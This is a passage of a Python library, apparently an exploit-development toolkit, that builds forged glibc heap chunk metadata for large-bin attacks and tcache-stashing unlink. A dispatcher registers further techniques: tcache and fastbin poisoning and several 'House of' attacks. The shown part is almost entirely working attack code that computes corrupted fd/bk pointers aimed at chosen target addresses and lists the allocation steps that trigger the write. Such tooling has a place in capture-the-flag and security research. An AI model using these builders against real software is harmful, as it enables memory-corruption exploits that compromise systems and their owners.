                             fd_nextsize=fns, bk_nextsize=bns)
    out = _Composer(c)
    out.add("forged_largebin_chunk", chunk, data, "large-bin links with bk_nextsize aimed before target", fields)
    compat = ("classic large-bin nextsize write" if c.version <= (2, 29)
              else "hardened large-bin checks require matching reciprocal links")
    return out.finish("large_bin_attack", (
        "place the victim in unsorted then trigger sorting into its large bin",
        "apply forged_largebin_chunk while retaining valid fd/bk links",
        "insert a suitably ordered second large chunk to exercise the nextsize write",
    ), ("fd_addr/bk_addr must be valid reciprocal list links",
        "target receives an allocator chunk pointer, not an arbitrary chosen scalar",
        "glibc 2.30+ requires additional reciprocal nextsize state"), compat,
        {"chunk_size": size, "write_target": target, "bk_nextsize": bns,
        "written_pointer_candidate": chunk})


def build_tcache_stashing_unlink(
    *, glibc_version: str, smallbin_chunk_addr: int, chunk_size: int, target_addr: int,
    smallbin_head_addr: int, bits: int = 64,
) -> HeapBuild:
    """Build corrupted small-bin BK metadata for tcache-stashing unlink."""
    c = _context(glibc_version, bits)
    _require_tcache(c)
    chunk = _aligned_address(c, smallbin_chunk_addr, "smallbin_chunk_addr")
    size = _aligned_size(c, chunk_size)
    if size > (0x3F0 if bits == 64 else 0x1F8):
        raise HeapBuildError("chunk_size is outside the conventional small-bin range")
    target = _address(target_addr, bits, "target_addr")
    head = _address(smallbin_head_addr, bits, "smallbin_head_addr")
    forged_bk = target - 2 * c.word
    _address(forged_bk, bits, "target_addr - fd offset")
    data, fields = _metadata(c, prev_size=0, size=size | PREV_INUSE, fd=head, bk=forged_bk)
    out = _Composer(c)
    out.add("corrupted_smallbin_chunk", chunk, data, "small-bin BK aimed so bck->fd aliases target", fields)
    return out.finish("tcache_stashing_unlink", (
        "prepare at least two same-size small-bin chunks and leave room in the matching tcache bin",
        "corrupt the selected small-bin chunk BK with corrupted_smallbin_chunk",
        "trigger a calloc/malloc path that stashes small-bin entries into tcache",
    ), ("the target glibc path must perform small-bin-to-tcache stashing",
        "remaining small-bin integrity links must be satisfiable",
        "the write stores a chunk pointer at target_addr"),
        "small-bin stashing write primitive", {"chunk_size": size, "write_target": target,
        "forged_bk": forged_bk, "written_pointer_candidate": chunk})


BUILDERS: Mapping[str, Callable[..., HeapBuild]] = {
    "tcache_dup": build_tcache_dup,
    "tcache_poison": build_tcache_poison,
    "fastbin_dup": build_fastbin_dup,
    "fastbin_poison": build_fastbin_poison,
    "unsorted_bin_leak": build_unsorted_bin_leak,
    "house_of_force": build_house_of_force,
    "house_of_orange": build_house_of_orange,
    "house_of_apple": build_house_of_apple,
    "house_of_einherjar": build_house_of_einherjar,
    "house_of_botcake": build_house_of_botcake,
    "house_of_spirit": build_house_of_spirit,
    "large_bin_attack": build_large_bin_attack,
    "tcache_stashing_unlink": build_tcache_stashing_unlink,
}


def build_heap(technique: str, /, **config: Any) -> HeapBuild:
    """Dispatch a normalized technique name to one of the offline builders."""
    if not isinstance(technique, str):
        raise HeapBuildError("technique must be text")
    normalized = technique.strip().lower().replace("-", "_").replace(" ", "_")
    normalized = {
        "tcache_poisoning": "tcache_poison",
        "fastbin_poisoning": "fastbin_poison",
        "unsorted_leak": "unsorted_bin_leak",
        "largebin": "large_bin_attack",
        "tcache_stashing": "tcache_stashing_unlink",
        "einherjar": "house_of_einherjar",
        "botcake": "house_of_botcake",
        "spirit": "house_of_spirit",
        "force": "house_of_force",
        "orange": "house_of_orange",
        "apple": "house_of_apple",
    }.get(normalized, normalized)
    try:
        builder = BUILDERS[normalized]
    except KeyError as exc:
        raise HeapBuildError(f"unknown heap technique {technique!r}; choose one of {', '.join(BUILDERS)}") from exc
    try:
        return builder(**config)
    except TypeError as exc:
        raise HeapBuildError(
            f"invalid arguments for heap technique {normalized!r}: {exc}"
        ) from exc


__all__ = [
    "BUILDERS", "HeapBuild", "HeapBuildError", "build_heap", "build_tcache_dup",
    "build_tcache_poison", "build_fastbin_dup", "build_fastbin_poison",
    "build_unsorted_bin_leak", "build_house_of_force", "build_house_of_orange",
    "build_house_of_apple", "build_house_of_einherjar", "build_house_of_botcake",
    "build_house_of_spirit", "build_large_bin_attack", "build_tcache_stashing_unlink",
]
